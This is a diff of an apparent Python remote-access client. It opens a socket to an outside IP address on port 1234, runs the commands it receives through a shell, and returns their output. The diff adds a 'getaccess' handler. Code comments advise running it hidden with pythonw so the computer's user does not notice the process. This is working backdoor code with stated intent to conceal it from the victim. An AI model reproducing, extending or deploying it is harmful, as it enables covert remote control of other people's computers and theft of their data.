@@ -5,7 +5,7 @@ from subprocess import call
 
 FORMAT = "utf-8"
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("10.0.26.244", 1234))
+s.connect(("131.155.246.144", 1234))
 # this file should be run in the background so the person using the pc is not aware of the process running
 # For this to happen, use the extension.pyw,
 # which will cause the script to be executed by pythonw.exe by default.
@@ -67,8 +67,10 @@ while (True):
         resulth = subprocess.run(cmdline2, cwd=dir, stdout=subprocess.PIPE, shell=True)
         print(resulth.stdout.decode())
         s.sendall(bytes(resulth.stdout.decode(), "utf-8"))
-        #s.sendall(bytes(samN, "utf-8"))    
-
+        #s.sendall(bytes(samN, "utf-8"))  
+    # just a response so we don't break the message response pattern  
+    if decodedMsg == "getaccess":
+        s.sendall(bytes("nice", "utf-8"))
     # https://docs.python.org/3/library/subprocess.html#subprocess.Popen.communicate
     # here we can see that we can get output from certain executions so maybe we can use this to execute commands one by one
     # could include like command and then choose which command to use
